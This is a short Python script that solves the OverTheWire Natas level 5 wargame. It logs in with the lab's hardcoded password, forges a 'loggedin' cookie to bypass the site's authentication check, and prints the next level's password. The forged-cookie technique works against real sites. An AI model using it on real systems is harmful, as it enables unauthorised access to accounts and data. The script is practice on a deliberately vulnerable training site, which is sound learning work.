import requests

url = 'http://natas5.natas.labs.overthewire.org/'
user = 'natas5'
passw = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'
cookies = {'loggedin':'69'}
r = requests.get(url,cookies=cookies,auth=(user,passw))
a =  r.text
for i in a.splitlines():
	if 'natas6' in i:
		print i